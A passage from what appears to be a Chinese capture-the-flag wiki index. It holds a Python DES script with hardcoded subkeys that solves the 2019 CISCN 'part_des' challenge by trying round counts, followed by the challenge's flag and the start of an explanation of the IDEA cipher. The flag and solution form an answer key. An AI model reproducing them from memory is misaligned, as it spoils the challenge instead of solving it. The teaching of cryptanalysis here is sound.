, 61 , 53 , 45 , 37 , 29 , 21 , 13 , 5 , 63 , 55 , 47 , 39 , 31 , 23 , 15 , 7 ] IP_re = [ 40 , 8 , 48 , 16 , 56 , 24 , 64 , 32 , 39 , 7 , 47 , 15 , 55 , 23 , 63 , 31 , 38 , 6 , 46 , 14 , 54 , 22 , 62 , 30 , 37 , 5 , 45 , 13 , 53 , 21 , 61 , 29 , 36 , 4 , 44 , 12 , 52 , 20 , 60 , 28 , 35 , 3 , 43 , 11 , 51 , 19 , 59 , 27 , 34 , 2 , 42 , 10 , 50 , 18 , 58 , 26 , 33 , 1 , 41 , 9 , 49 , 17 , 57 , 25 ] Pbox = [ 16 , 7 , 20 , 21 , 29 , 12 , 28 , 17 , 1 , 15 , 23 , 26 , 5 , 18 , 31 , 10 , 2 , 8 , 24 , 14 , 32 , 27 , 3 , 9 , 19 , 13 , 30 , 6 , 22 , 11 , 4 , 25 ] E = [ 32 , 1 , 2 , 3 , 4 , 5 , 4 , 5 , 6 , 7 , 8 , 9 , 8 , 9 , 10 , 11 , 12 , 13 , 12 , 13 , 14 , 15 , 16 , 17 , 16 , 17 , 18 , 19 , 20 , 21 , 20 , 21 , 22 , 23 , 24 , 25 , 24 , 25 , 26 , 27 , 28 , 29 , 28 , 29 , 30 , 31 , 32 , 1 ] PC1 = [ 57 , 49 , 41 , 33 , 25 , 17 , 9 , 1 , 58 , 50 , 42 , 34 , 26 , 18 , 10 , 2 , 59 , 51 , 43 , 35 , 27 , 19 , 11 , 3 , 60 , 52 , 44 , 36 , 63 , 55 , 47 , 39 , 31 , 23 , 15 , 7 , 62 , 54 , 46 , 38 , 30 , 22 , 14 , 6 , 61 , 53 , 45 , 37 , 29 , 21 , 13 , 5 , 28 , 20 , 12 , 4 ] PC2 = [ 14 , 17 , 11 , 24 , 1 , 5 , 3 , 28 , 15 , 6 , 21 , 10 , 23 , 19 , 12 , 4 , 26 , 8 , 16 , 7 , 27 , 20 , 13 , 2 , 41 , 52 , 31 , 37 , 47 , 55 , 30 , 40 , 51 , 45 , 33 , 48 , 44 , 49 , 39 , 56 , 34 , 53 , 46 , 42 , 50 , 36 , 29 , 32 ] Sbox = [ [ [ 14 , 4 , 13 , 1 , 2 , 15 , 11 , 8 , 3 , 10 , 6 , 12 , 5 , 9 , 0 , 7 ], [ 0 , 15 , 7 , 4 , 14 , 2 , 13 , 1 , 10 , 6 , 12 , 11 , 9 , 5 , 3 , 8 ], [ 4 , 1 , 14 , 8 , 13 , 6 , 2 , 11 , 15 , 12 , 9 , 7 , 3 , 10 , 5 , 0 ], [ 15 , 12 , 8 , 2 , 4 , 9 , 1 , 7 , 5 , 11 , 3 , 14 , 10 , 0 , 6 , 13 ], ], [ [ 15 , 1 , 8 , 14 , 6 , 11 , 3 , 4 , 9 , 7 , 2 , 13 , 12 , 0 , 5 , 10 ], [ 3 , 13 , 4 , 7 , 15 , 2 , 8 , 14 , 12 , 0 , 1 , 10 , 6 , 9 , 11 , 5 ], [ 0 , 14 , 7 , 11 , 10 , 4 , 13 , 1 , 5 , 8 , 12 , 6 , 9 , 3 , 2 , 15 ], [ 13 , 8 , 10 , 1 , 3 , 15 , 4 , 2 , 11 , 6 , 7 , 12 , 0 , 5 , 14 , 9 ], ], [ [ 10 , 0 , 9 , 14 , 6 , 3 , 15 , 5 , 1 , 13 , 12 , 7 , 11 , 4 , 2 , 8 ], [ 13 , 7 , 0 , 9 , 3 , 4 , 6 , 10 , 2 , 8 , 5 , 14 , 12 , 11 , 15 , 1 ], [ 13 , 6 , 4 , 9 , 8 , 15 , 3 , 0 , 11 , 1 , 2 , 12 , 5 , 10 , 14 , 7 ], [ 1 , 10 , 13 , 0 , 6 , 9 , 8 , 7 , 4 , 15 , 14 , 3 , 11 , 5 , 2 , 12 ], ], [ [ 7 , 13 , 14 , 3 , 0 , 6 , 9 , 10 , 1 , 2 , 8 , 5 , 11 , 12 , 4 , 15 ], [ 13 , 8 , 11 , 5 , 6 , 15 , 0 , 3 , 4 , 7 , 2 , 12 , 1 , 10 , 14 , 9 ], [ 10 , 6 , 9 , 0 , 12 , 11 , 7 , 13 , 15 , 1 , 3 , 14 , 5 , 2 , 8 , 4 ], [ 3 , 15 , 0 , 6 , 10 , 1 , 13 , 8 , 9 , 4 , 5 , 11 , 12 , 7 , 2 , 14 ], ], [ [ 2 , 12 , 4 , 1 , 7 , 10 , 11 , 6 , 8 , 5 , 3 , 15 , 13 , 0 , 14 , 9 ], [ 14 , 11 , 2 , 12 , 4 , 7 , 13 , 1 , 5 , 0 , 15 , 10 , 3 , 9 , 8 , 6 ], [ 4 , 2 , 1 , 11 , 10 , 13 , 7 , 8 , 15 , 9 , 12 , 5 , 6 , 3 , 0 , 14 ], [ 11 , 8 , 12 , 7 , 1 , 14 , 2 , 13 , 6 , 15 , 0 , 9 , 10 , 4 , 5 , 3 ], ], [ [ 12 , 1 , 10 , 15 , 9 , 2 , 6 , 8 , 0 , 13 , 3 , 4 , 14 , 7 , 5 , 11 ], [ 10 , 15 , 4 , 2 , 7 , 12 , 9 , 5 , 6 , 1 , 13 , 14 , 0 , 11 , 3 , 8 ], [ 9 , 14 , 15 , 5 , 2 , 8 , 12 , 3 , 7 , 0 , 4 , 10 , 1 , 13 , 11 , 6 ], [ 4 , 3 , 2 , 12 , 9 , 5 , 15 , 10 , 11 , 14 , 1 , 7 , 6 , 0 , 8 , 13 ], ], [ [ 4 , 11 , 2 , 14 , 15 , 0 , 8 , 13 , 3 , 12 , 9 , 7 , 5 , 10 , 6 , 1 ], [ 13 , 0 , 11 , 7 , 4 , 9 , 1 , 10 , 14 , 3 , 5 , 12 , 2 , 15 , 8 , 6 ], [ 1 , 4 , 11 , 13 , 12 , 3 , 7 , 14 , 10 , 15 , 6 , 8 , 0 , 5 , 9 , 2 ], [ 6 , 11 , 13 , 8 , 1 , 4 , 10 , 7 , 9 , 5 , 0 , 15 , 14 , 2 , 3 , 12 ], ], [ [ 13 , 2 , 8 , 4 , 6 , 15 , 11 , 1 , 10 , 9 , 3 , 14 , 5 , 0 , 12 , 7 ], [ 1 , 15 , 13 , 8 , 10 , 3 , 7 , 4 , 12 , 5 , 6 , 11 , 0 , 14 , 9 , 2 ], [ 7 , 11 , 4 , 1 , 9 , 12 , 14 , 2 , 0 , 6 , 10 , 13 , 15 , 3 , 5 , 8 ], [ 2 , 1 , 14 , 7 , 4 , 10 , 8 , 13 , 15 , 12 , 9 , 0 , 3 , 5 , 6 , 11 ], ] ] rout = [ 1 , 1 , 2 , 2 , 2 , 2 , 2 , 2 , 1 , 2 , 2 , 2 , 2 , 2 , 2 , 1 ] def __init__ ( self ): self . subkey = [[[ 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 ], [ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 ], [ 1 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 1 ], [ 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 ], [ 1 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 ], [ 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 ], [ 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 ], [ 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 ], [ 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 ], [ 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 ], [ 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 ], [ 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 ], [ 1 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 ], [ 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 ], [ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 ], [ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 ]], [[ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 ], [ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 ], [ 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 ], [ 1 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 ], [ 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 ], [ 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 ], [ 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 ], [ 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 ], [ 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 ], [ 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 ], [ 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 ], [ 1 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 ], [ 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 ], [ 1 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 1 ], [ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 ], [ 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 ]]] def permute ( self , lst , tb ): return [ lst [ i - 1 ] for i in tb ] def f ( self , riti , subkeyi ): tmp = [ i ^ j for i , j in zip ( subkeyi , self . permute ( riti , DES . E ))] return self . permute ( sum ([[ int ( l ) for l in str ( bin ( DES . Sbox [ i ][ int ( str ( tmp [ 6 * i ]) + str ( tmp [ 6 * i + 5 ]), 2 )][ int ( \"\" . join ( str ( j ) for j in tmp [ 6 * i + 1 : 6 * i + 5 ]), 2 )])[ 2 :] . zfill ( 4 ))] for i in range ( 8 )],[]), DES . Pbox ) def des_main ( self , m , mark ): sbkey = self . subkey [ 0 ] #if mark == 'e' else self.subkey[1] # tmp = self.permute([int(i) for i in list((m).ljust(64,\"0\"))],self.IP) tmp = [ int ( i ) for i in list (( m ) . ljust ( 64 , \"0\" ))] global kkk print ( kkk ) for i in range ( kkk ): tmp = tmp [ 32 :] + [ j ^ k for j , k in zip ( tmp [: 32 ], self . f ( tmp [ 32 :], sbkey [ i if mark != 'd' else kkk - 1 - i ]))] return \"\" . join ([ str ( i ) for i in self . permute ( tmp [ 32 :] + tmp [: 32 ], self . IP_re )]) def des_encipher ( self , m ): m = \"\" . join ([ bin ( ord ( i ))[ 2 :] . zfill ( 8 ) for i in m ]) des_en = self . des_main ( m , 'e' ) return \"\" . join ([ chr ( int ( des_en [ i * 8 : i * 8 + 8 ], 2 )) for i in range ( 8 )]) def des_decipher ( self , c ): c = \"\" . join ([ bin ( ord ( i ))[ 2 :] . zfill ( 8 ) for i in c ]) des_de = self . des_main ( c , 'd' ) return \"\" . join ([ chr ( int ( des_de [ i * 8 : i * 8 + 8 ], 2 )) for i in range ( 8 )]) def test (): import base64 global kkk while kkk >= 0 : desobj = DES () # cipher = desobj.des_encipher(\"12345678\") cipher = ' \\x01\\x19\\xe1 + \\x92\\xd9\\x15 %' message1 = desobj . des_decipher ( cipher ) print ( message1 ) kkk -= 1 if __name__ == '__main__' : test () \u89e3\u5bc6\u7ed3\u679c\uff08\u90e8\u5206\uff09\uff1a 14 t-\u00cfE\u00cfx\u0090\u00a7 13 y0ur9Ood 12 \u00b5p^\u00db\u00e9=\u00b9\u0088 11 )\u00c1`r\u00fb\u00d5\u00fb\u009d \u53ef\u4ee5\u770b\u51fan\u4e3a13\uff0cflag\u4e3a flag{y0ur9Ood}","title":"2019 CISCN  part_des"},{"location":"crypto/blockcipher/des/#_8","text":"\u6e05\u534e\u5927\u5b66\u7814\u7a76\u751f\u6570\u636e\u5b89\u5168\u8bfe\u7a0b\u8bfe\u4ef6 https://en.wikipedia.org/wiki/Data_Encryption_Standard","title":"\u53c2\u8003"},{"location":"crypto/blockcipher/idea/","text":"IDEA \u00b6 \u6982\u8ff0 \u00b6 \u56fd\u9645\u6570\u636e\u52a0\u5bc6\u7b97\u6cd5 \uff08International Data Encryption Algorithm\uff0cIDEA\uff09\uff0c\u6700\u65e9\u79f0\u4e3a \u6539\u826f\u5efa\u8bae\u52a0\u5bc6\u6807\u51c6 \uff08Improved Proposed Encryption Standard\uff0cIPES\uff09\uff0c\u662f\u5bc6\u7801\u5b66\u4e0a\u4e00\u79cd\u5bf9\u79f0\u5bc6\u94a5\u5206\u7ec4\u5bc6\u7801\uff0c\u7531 James Massey \u4e0e\u6765\u5b66\u5609\u8bbe\u8ba1\uff0c\u57281991\u5e74\u9996\u6b21\u63d0\u51fa\u3002\u8fd9\u4e2a\u7b97\u6cd5\u7684\u63d0\u51fa\uff0c\u662f\u4e3a\u4e86\u53d6\u4ee3\u65e7\u6709\u7684\u6570\u636e\u52a0\u5bc6\u6807\u51c6 DES\u3002\uff08\u6765\u81ea\u7ef4\u57fa\u767e\u79d1\uff09 \u57fa\u672c\u6d41\u7a0b \u00b6 \u5bc6\u94a5\u751f\u6210 \u00b6 IDEA \u5728\u52a0\u5bc6\u7684\u6bcf\u8f6e\u4e2d\u4f7f\u7528 6\u4e2a\u5bc6\u94a5\uff0c\u7136\u540e\u6700\u540e\u8f93\u51fa\u8f6e\u4f7f\u75284\u4e2a\u5bc6\u94a5\u3002\u6240\u4ee5\u4e00\u5171\u670952\u4e2a\u3002 \u524d8\u4e2a\u5bc6\u94a5\u6765\u81ea\u4e0e\u8be5\u7b97\u6cd5\u6700\u521d\u7684\u5bc6\u94a5\uff0cK1 \u53d6\u81ea\u5bc6\u94a5\u7684\u9ad816\u6bd4\u7279\uff0cK8 \u53d6\u81ea\u5bc6\u94a5\u7684\u4f4e16\u6bd4\u7279\u3002 \u5c06\u5bc6\u94a5\u5faa\u73af\u5de6\u79fb 25 \u4f4d\u83b7\u53d6\u4e0b\u4e00\u8f6e\u5bc6\u94a5\uff0c\u7136\u540e\u518d\u6b21\u5206\u4e3a8\u7ec4\u3002 \u52a0\u5bc6\u6d41\u7a0b \u00b6 IDEA \u52a0\u5bc6\u7684\u6570\u636e\u5757\u7684\u5927\u5c0f\u4e3a 64 \u6bd4\u7279\uff0c\u5176\u4f7f\u7528\u7684\u5bc6\u94a5\u957f\u5ea6\u4e3a128 \u6bd4\u7279\u3002\u8be5\u7b97\u6cd5\u4f1a\u5bf9\u8f93\u5165\u7684\u6570\u636e\u5757\u8fdb\u884c8\u6b21\u76f8\u540c\u7684\u53d8\u6362\uff0c\u53ea\u662f\u6bcf\u6b21\u4f7f\u7528\u7684\u5bc6\u94a5\u4e0d\u540c\uff0c\u6700\u540e\u4f1a\u8fdb\u884c\u4e00\u6b21\u8f93\u51fa\u53d8\u6362\u3002\u6bcf\u4e00\u8f6e\u7684\u64cd\u4f5c \u53ef\u4ee5\u8f93\u5165\u548c\u8f93\u51fa\u90fd\u662f 16 \u6bd4\u7279\u4f4d\u4e00\u7ec4\u3002\u6bcf\u4e00\u8f6e\u7684\u4e3b\u8981\u6267\u884c\u7684\u8fd0\u7b97\u6709 \u6309\u4f4d\u5f02\u6216\uff0c\u2295 \u6a21\u52a0\uff0c\u6a21\u6570\u4e3a 2^{16} 2^{16} \uff0c\u229e \u6a21\u4e58\uff0c\u6a21\u6570\u4e3a 2^{16}+1 2^{16}+1 \uff0c\u2299\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f 0x0000 \u7684\u8f93\u5165\u4f1a\u88ab\u4fee\u6539\u4e3a 2^{16} 2^{16} \uff0c 2^{16} 2^{16} \u7684\u8f93\u51fa\u7ed3\u679c\u4f1a\u88ab\u4fee\u6539\u4e3a0x0000\u3002 \u8fd9\u91cc\u6211\u4eec\u79f0\u7531 K5\uff0cK6 \u6784\u6210\u7684\u4e2d\u95f4\u90a3\u4e2a\u65b9\u683c\u7684\u52a0\u5bc6\u65b9\u5f0f\u4e3aMA\u3002\u8fd9\u4e5f\u662f IDEA \u7b97\u6cd5\u4e2d\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u6b64\u5916\uff0c\u6211\u4eec\u79f0 MA_L \u4e3a\u8be5\u90e8\u5206\u52a0\u5bc6\u540e\u7684\u5de6\u4fa7\u7ed3\u679c\uff0c\u5176\u6700\u540e\u4f1a\u548c\u6700\u5de6\u8fb9\u7684 16 \u6bd4\u7279\u64cd\u4f5c\uff1bMA_R \u4e3a\u8be5\u90e8\u5206\u52a0\u5bc6\u540e\u7684\u53f3\u534a\u90e8\u5206\u7684\u7ed3\u679c\uff0c\u5176\u6700\u540e\u4f1a\u548c\u7b2c\u4e09\u4e2a 16 \u6bd4\u7279\u64cd\u4f5c\u3002 \u5728\u6700\u540e\u8f93\u51fa\u8f6e\u7684\u64cd\u4f5c\u5982\u4e0b \u89e3\u5bc6\u6d41\u7a0b \u00b6 \u89e3\u5bc6\u6d41\u7a0b\u4e0e\u52a0\u5bc6\u6d41\u7a0b\u76f8\u4f3c\uff0c\u4e3b\u8981\u5728\u4e8e\u5176\u5bc6\u94a5\u7684\u9009\u53d6 \u7b2c i(1-9) \u8f6e\u7684\u89e3\u5bc6\u7684\u5bc6\u94a5\u7684\u524d 4 \u4e2a\u5b50\u5bc6\u94a5\u7531\u52a0\u5bc6\u8fc7\u7a0b\u4e2d\u7b2c10-i \u8f6e\u7684\u524d 4 \u4e2a\u5b50\u5bc6\u94a5\u5f97\u51fa \u5176\u4e2d\u7b2c 1 \u4e2a\u548c\u7b2c 4 \u4e2a\u89e3\u5bc6\u5b50\u5bc6\u94a5\u4e3a\u76f8\u5e94\u7684\u5b50\u5bc6\u94a5\u5173\u4e8e 2^{16}+1 2^{16}+1 \u7684\u4e58\u6cd5\u9006\u5143\u3002 \u7b2c 2 \u4e2a\u548c\u7b2c 3 \u4e2a\u5b50\u5bc6\u94a5\u7684\u53d6\u6cd5\u4e3a \u5f53\u8f6e\u6570\u4e3a2\uff0c...\uff0c8\u65f6\uff0c\u53d6\u76f8\u5e94\u7684\u7b2c3\u4e2a\u548c\u7b2c2\u4e2a\u7684\u5b50\u5bc6\u94a5\u7684 2^{16} 2^{16} \u7684\u52a0\u5bc6\u9006\u5143\u3002 \u5f53\u8f6e\u6570\u4e3a 1 \u6216 9 \u65f6\uff0c\u53d6\u76f8\u5e94\u7684\u7b2c 2 \u4e2a\u548c\u7b2c 3 \u4e2a\u5b50\u5bc6\u94a5\u5bf9\u5e94\u7684 2^{16} 2^{16} \u7684\u52a0\u5bc6\u9006\u5143\u3002 \u7b2c 5 \u548c\u7b2c 6 \u4e2a\u5bc6\u94a5\u4e0d\u53d8\u3002 \u603b\u4f53\u6d41\u7a0b \u00b6 \u6211\u4eec\u6765\u8bc1\u660e\u4e00\u4e0b\u7b97\u6cd5\u7684\u6b63\u786e\u6027\uff0c\u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u4e8e\u89e3\u5bc6\u7b97\u6cd5\u7684\u7b2c\u4e00\u8f6e\uff0c\u9996\u5148\u6211\u4eec\u5148\u770b\u4e00\u4e0b Y_i Y_i \u662f\u5982\u4f55\u5f97\u5230\u7684 Y_1 = W_{81} \\odot Z_{49} Y_1 = W_{81} \\odot Z_{49} Y_2=W_{83}\\boxplus Z_{50} Y_2=W_{83}\\boxplus Z_{50} Y_3=W_{82}\\boxplus Z_{51} Y_3=W_{82}\\boxplus Z_{51} Y_4=W_{83}\\odot Z_{52} Y_4=W_{83}\\odot Z_{52} \u89e3\u5bc6\u65f6\uff0c\u7b2c\u4e00\u8f6e\u76f4\u63a5\u8fdb\u884c\u7684\u53d8\u6362\u4e3a J_{11}=Y_1 \\odot U_1=Y_1 \\odot Z_{49}^{-1}=W_{81} J_{11}=Y_1 \\odot U_1=Y_1 \\odot Z_{49}^{-1}=W_{81} J_{12}=Y_2 \\boxplus U2=Y_2\\boxplus Z_{50}^{-1}=W_{83} J_{12}=Y_2 \\boxplus U2=Y_2\\boxplus 